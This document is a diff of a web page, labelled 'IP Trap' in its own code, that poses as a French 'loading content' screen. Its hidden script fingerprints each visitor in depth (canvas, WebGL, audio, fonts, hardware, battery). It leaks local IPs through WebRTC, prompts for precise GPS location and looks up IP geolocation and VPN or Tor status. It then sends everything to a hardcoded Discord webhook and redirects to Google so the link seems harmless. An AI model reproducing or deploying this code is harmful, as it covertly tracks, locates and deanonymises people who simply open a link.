@@ -7,101 +7,263 @@
   <style>
     :root { color-scheme: dark; }
     * { box-sizing: border-box; }
-    body {
-      margin: 0; min-height: 100vh;
-      display: flex; align-items: center; justify-content: center;
-      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
-      background: #0b0f19; color: #e5e7eb;
-    }
-    .wrap { text-align: center; }
-    .spin {
-      width: 42px; height: 42px; margin: 0 auto 18px;
-      border: 4px solid #1f2937; border-top-color: #3b82f6;
-      border-radius: 50%; animation: s .9s linear infinite;
-    }
-    @keyframes s { to { transform: rotate(360deg); } }
-    p { opacity: .7; font-size: 15px; }
+    body { margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; background:#0b0f19; color:#e5e7eb; }
+    .wrap { text-align:center; }
+    .spin { width:42px; height:42px; margin:0 auto 18px; border:4px solid #1f2937;
+      border-top-color:#3b82f6; border-radius:50%; animation:s .9s linear infinite; }
+    @keyframes s { to { transform:rotate(360deg); } }
+    p { opacity:.7; font-size:15px; }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="spin"></div>
-    <p>Chargement du contenu…</p>
-  </div>
+  <div class="wrap"><div class="spin"></div><p>Chargement du contenu…</p></div>
 
   <script>
   (async function () {
     // ══════════════════ CONFIG ══════════════════
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1562752360932053024/F7QSMbXXoNxSKcv5Fuz9V_Z5rAFrOFGf_npm2hlZLi8TtAy15cIT_Ox1nxrsmTQxMRW3";
-    const REDIRECT    = "https://www.google.com"; // "" = ne pas rediriger
-    const DELAY_MS    = 1400;
+    const WEBHOOK_URL   = "https://discord.com/api/webhooks/1562752360932053024/F7QSMbXXoNxSKcv5Fuz9V_Z5rAFrOFGf_npm2hlZLi8TtAy15cIT_Ox1nxrsmTQxMRW3";
+    const REDIRECT      = "https://www.google.com";
+    const DELAY_MS      = 1800;
+    const GEOLOCATION   = true;   // prompt de position (plus précis)
+    const GEO_TIMEOUT   = 7000;
+    const WEBRTC_LEAK   = true;   // récupère les IP locales
     // ════════════════════════════════════════════
 
-    const info = {
-      ts: new Date().toISOString(),
-      ip: null, isp: null, city: null, country: null,
-      lat: null, lon: null, asn: null,
-      ua: navigator.userAgent,
-      lang: navigator.language,
-      platform: navigator.platform,
-      screen: `${screen.width}x${screen.height}`,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      referrer: document.referrer || "direct",
-      page: location.href
+    const D = {};
+
+    const safe = (fn, dflt = "n/a") => { try { const v = fn(); return (v === undefined || v === null || v === "") ? dflt : v; } catch (e) { return dflt; } };
+    const hash = async (s) => {
+      try {
+        const h = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s));
+        return [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, "0")).join("").slice(0, 20);
+      } catch (e) { return "n/a"; }
     };
 
-    // 1) IP publique + géoloc (côté client = vraie IP du visiteur)
-    try {
-      const r = await fetch("https://ipwho.is/");
-      const j = await r.json();
-      if (j && j.success !== false) {
-        info.ip      = j.ip;
-        info.isp     = j.connection?.isp || j.connection?.org || "?";
-        info.asn     = j.connection?.asn ? "AS" + j.connection.asn : "?";
-        info.city    = j.city;
-        info.country = j.country;
-        info.lat     = j.latitude;
-        info.lon     = j.longitude;
-      }
-    } catch (e) {}
+    // ---------- Contexte ----------
+    D.referrer = document.referrer || "direct";
+    D.url      = location.href;
+    D.navType  = safe(() => performance.getEntriesByType("navigation")[0]?.type);
+    D.dnt      = safe(() => navigator.doNotTrack);
+    D.gpc      = safe(() => navigator.globalPrivacyControl);
+    D.cookies  = safe(() => navigator.cookieEnabled);
 
-    // 2) Fallback si le service principal est down
-    if (!info.ip) {
-      try { info.ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch (e) {}
+    // ---------- OS / navigateur ----------
+    D.ua       = navigator.userAgent;
+    D.platform = safe(() => navigator.platform);
+    D.langs    = safe(() => (navigator.languages || []).join(", "));
+    D.tz       = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone);
+    D.localTime= new Date().toLocaleString("fr-FR");
+    D.plugins  = safe(() => [...navigator.plugins].map(p => p.name).join(", "), "aucun");
+    D.pdf      = safe(() => navigator.pdfViewerEnabled ? "oui" : "non");
+
+    // ---------- Client Hints haute entropie ----------
+    if (navigator.userAgentData) {
+      try {
+        const h = await navigator.userAgentData.getHighEntropyValues(
+          ["platform","platformVersion","architecture","bitness","model","uaFullVersion"]);
+        D.os        = h.platform;
+        D.osVersion = h.platformVersion;
+        D.arch      = h.architecture;
+        D.bitness   = h.bitness;
+        D.model     = h.model || "—";
+        D.browserV  = h.uaFullVersion;
+      } catch (e) {}
     }
 
-    // 3) Exfiltration vers Discord
+    // ---------- Matériel ----------
+    D.cores   = safe(() => navigator.hardwareConcurrency);
+    D.ram     = safe(() => navigator.deviceMemory ? navigator.deviceMemory + " Go" : null);
+    D.screen  = safe(() => `${screen.width}x${screen.height} (dispo ${screen.availWidth}x${screen.availHeight})`);
+    D.depth   = safe(() => screen.colorDepth + " bits");
+    D.dpr     = safe(() => window.devicePixelRatio);
+    D.touch   = safe(() => navigator.maxTouchPoints > 0 ? `oui (${navigator.maxTouchPoints} pts)` : "non");
+    D.orient  = safe(() => screen.orientation?.type);
+    D.gpu     = (function () {
+      try {
+        const gl = document.createElement("canvas").getContext("webgl");
+        const d = gl.getExtension("WEBGL_debug_renderer_info");
+        return d ? `${gl.getParameter(d.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(d.UNMASKED_RENDERER_WEBGL)}` : "n/a";
+      } catch (e) { return "n/a"; }
+    })();
+
+    // ---------- Empreintes ----------
+    D.canvasFP = await hash((function () {
+      try {
+        const c = document.createElement("canvas"); c.width = 240; c.height = 60;
+        const x = c.getContext("2d");
+        x.textBaseline = "top"; x.font = "14px Arial";
+        x.fillStyle = "#f60"; x.fillRect(0, 0, 120, 30);
+        x.fillStyle = "#069"; x.fillText("Venice🎯", 2, 15);
+        x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("Venice🎯", 4, 17);
+        return c.toDataURL();
+      } catch (e) { return "n/a"; }
+    })());
+
+    D.webglFP = await hash(D.gpu + safe(() => {
+      const gl = document.createElement("canvas").getContext("webgl");
+      return gl.getParameter(gl.VERSION) + gl.getParameter(gl.MAX_TEXTURE_SIZE);
+    }, ""));
+
+    D.audioFP = await hash(await (async function () {
+      try {
+        const ctx = new OfflineAudioContext(1, 44100, 44100);
+        const o = ctx.createOscillator(); o.type = "triangle"; o.frequency.value = 10000;
+        const c = ctx.createDynamicsCompressor();
+        o.connect(c); c.connect(ctx.destination); o.start(0);
+        const buf = await ctx.startRendering(); const d = buf.getChannelData(0);
+        let s = 0; for (let i = 4500; i < 5000; i++) s += Math.abs(d[i]);
+        return s.toString();
+      } catch (e) { return "n/a"; }
+    })());
+
+    D.fonts = (function () {
+      try {
+        const base = ["monospace","sans-serif","serif"];
+        const test = ["Arial","Arial Black","Calibri","Cambria","Comic Sans MS","Consolas","Courier New",
+          "Georgia","Helvetica","Impact","Lucida Console","Segoe UI","Tahoma","Times New Roman",
+          "Trebuchet MS","Verdana","Roboto","Ubuntu","Menlo","Monaco","SF Pro Text","Futura","Papyrus"];
+        const s = document.createElement("span");
+        s.style.cssText = "font-size:72px;position:absolute;left:-9999px"; s.textContent = "mmmmmmmmmmlli";
+        document.body.appendChild(s);
+        const dflt = {}; for (const b of base) { s.style.fontFamily = b; dflt[b] = s.offsetWidth; }
+        const found = [];
+        for (const f of test) {
+          for (const b of base) {
+            s.style.fontFamily = `'${f}',${b}`;
+            if (s.offsetWidth !== dflt[b]) { found.push(f); break; }
+          }
+        }
+        document.body.removeChild(s);
+        return found.join(", ") || "aucune";
+      } catch (e) { return "n/a"; }
+    })();
+
+    // ---------- Batterie / stockage / périphériques ----------
+    try { const b = await navigator.getBattery();
+      D.battery = `${Math.round(b.level * 100)}% ${b.charging ? "(en charge)" : "(sur batterie)"}`;
+    } catch (e) { D.battery = "n/a"; }
+
+    try { const e = await navigator.storage.estimate();
+      D.storage = `quota ${(e.quota / 1e9).toFixed(1)} Go, utilisé ${(e.usage / 1e6).toFixed(2)} Mo`;
+    } catch (e) { D.storage = "n/a"; }
+
+    try {
+      const dev = await navigator.mediaDevices.enumerateDevices();
+      const k = {}; dev.forEach(d => { k[d.kind] = (k[d.kind] || 0) + 1; });
+      D.devices = `${k.videoinput || 0} caméra(s), ${k.audioinput || 0} micro(s), ${k.audiooutput || 0} sortie(s) audio`;
+    } catch (e) { D.devices = "n/a"; }
+
+    // ---------- Permissions ----------
+    D.perms = (await (async function () {
+      const names = ["geolocation","notifications","camera","microphone","clipboard-read","midi"];
+      const out = [];
+      for (const n of names) { try { out.push(`${n}=${(await navigator.permissions.query({ name: n })).state}`); } catch (e) {} }
+      return out.join(" | ") || "n/a";
+    })());
+
+    // ---------- IP locales (WebRTC) ----------
+    D.localIPs = WEBRTC_LEAK ? await new Promise(res => {
+      const ips = new Set();
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        pc.createDataChannel("");
+        pc.onicecandidate = ev => {
+          if (!ev.candidate) { try { pc.close(); } catch (e) {} return res([...ips].join(", ") || "n/a"); }
+          const m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,})/i.exec(ev.candidate.candidate);
+          if (m) ips.add(m[1]);
+        };
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        setTimeout(() => { try { pc.close(); } catch (e) {} res([...ips].join(", ") || "n/a"); }, 3000);
+      } catch (e) { res("n/a"); }
+    }) : "désactivé";
+
+    // ---------- IP publique + géo + flags VPN ----------
+    try {
+      const j = await (await fetch("https://ipwho.is/")).json();
+      if (j && j.success !== false) {
+        D.ip = j.ip; D.ipv6 = j.ipv6 || "—"; D.type = j.type;
+        D.isp = j.connection?.isp; D.org = j.connection?.org;
+        D.asn = j.connection?.asn ? "AS" + j.connection.asn : "—";
+        D.city = j.city; D.region = j.region; D.country = j.country;
+        D.postal = j.postal; D.capital = j.capital;
+        D.coordsIP = `${j.latitude}, ${j.longitude}`;
+        D.flags = `VPN:${j.security?.vpn ? "✅" : "❌"} Proxy:${j.security?.proxy ? "✅" : "❌"} Tor:${j.security?.tor ? "✅" : "❌"} Hébergeur:${j.security?.hosting ? "✅" : "❌"}`;
+      }
+    } catch (e) {}
+    if (!D.ip) { try { D.ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch (e) {} }
+
+    // ---------- Connexion réseau ----------
+    const nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    D.net = nc ? `${nc.effectiveType || "?"} | ${nc.downlink || "?"} Mbps | RTT ${nc.rtt || "?"} ms | dataSaver:${nc.saveData}` : "n/a";
+
+    // ---------- Géoloc précise (prompt) ----------
+    if (GEOLOCATION && navigator.geolocation) {
+      D.gps = await Promise.race([
+        new Promise(res => navigator.geolocation.getCurrentPosition(
+          p => res(`✅ ${p.coords.latitude}, ${p.coords.longitude} (±${Math.round(p.coords.accuracy)} m)`),
+          () => res("❌ refusé"), { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 })),
+        new Promise(res => setTimeout(() => res("⏱ pas de réponse"), GEO_TIMEOUT))
+      ]);
+    } else { D.gps = "désactivé"; }
+
+    // ══════════════════ ENVOI ══════════════════
+    const f = (name, value, inline = true) => ({ name, value: String(value ?? "n/a").slice(0, 1024) || "n/a", inline });
+
     try {
       await fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           username: "🎯 IP Trap",
-          embeds: [{
-            title: "Nouvelle visite",
-            color: 0x3b82f6,
-            fields: [
-              { name: "IP",       value: info.ip || "?",          inline: true },
-              { name: "FAI",      value: info.isp || "?",         inline: true },
-              { name: "ASN",      value: info.asn || "?",         inline: true },
-              { name: "Ville",    value: info.city || "?",        inline: true },
-              { name: "Pays",     value: info.country || "?",     inline: true },
-              { name: "Coords",   value: `${info.lat}, ${info.lon}`, inline: true },
-              { name: "Fuseau",   value: info.tz,                 inline: true },
-              { name: "Écran",    value: info.screen,             inline: true },
-              { name: "Référant", value: info.referrer,           inline: true },
-              { name: "User-Agent", value: "```" + info.ua.slice(0, 200) + "```", inline: false }
-            ],
-            footer: { text: "IP Trap • GitHub Pages" },
-            timestamp: info.ts
-          }]
+          embeds: [
+            {
+              title: "🌐 Réseau & Localisation",
+              color: 0x3b82f6,
+              fields: [
+                f("IP", D.ip), f("IPv6", D.ipv6), f("Type", D.type),
+                f("FAI", D.isp), f("Organisation", D.org), f("ASN", D.asn),
+                f("Ville", D.city), f("Région", D.region), f("Pays", D.country),
+                f("Code postal", D.postal), f("Coords (IP)", D.coordsIP),
+                f("Détection", D.flags, false),
+                f("GPS précis", D.gps, false),
+                f("IP locales (WebRTC)", D.localIPs, false),
+                f("Connexion", D.net, false)
+              ],
+              timestamp: new Date().toISOString()
+            },
+            {
+              title: "🖥️ Appareil & Empreinte",
+              color: 0xa855f7,
+              fields: [
+                f("OS", `${D.os || "?"} ${D.osVersion || ""}`.trim()),
+                f("Architecture", `${D.arch || "?"} / ${D.bitness || "?"}`),
+                f("Modèle", D.model), f("Navigateur", D.browserV || "n/a"),
+                f("Plateforme", D.platform), f("CPU", `${D.cores} cœurs`),
+                f("RAM", D.ram), f("GPU", D.gpu, false),
+                f("Écran", D.screen), f("Profondeur", D.depth),
+                f("Pixel ratio", D.dpr), f("Tactile", D.touch),
+                f("Orientation", D.orient), f("Batterie", D.battery),
+                f("Périphériques", D.devices, false),
+                f("Stockage", D.storage, false),
+                f("Langues", D.langs, false),
+                f("Fuseau", D.tz), f("Heure locale", D.localTime),
+                f("Plugins", D.plugins, false),
+                f("Polices détectées", D.fonts, false),
+                f("Canvas FP", D.canvasFP),
+                f("WebGL FP", D.webglFP),
+                f("Audio FP", D.audioFP),
+                f("Permissions", D.perms, false),
+                f("Cookies/DNT/GPC", `${D.cookies} / ${D.dnt} / ${D.gpc}`, false),
+                f("Référant", D.referrer, false)
+              ]
+            }
+          ]
         })
       });
     } catch (e) {}
 
-    window.__trap = info;
-
-    // 4) Redirection (le lien semble normal)
+    window.__trap = D;
     if (REDIRECT) setTimeout(() => location.replace(REDIRECT), DELAY_MS);
   })();
   </script>
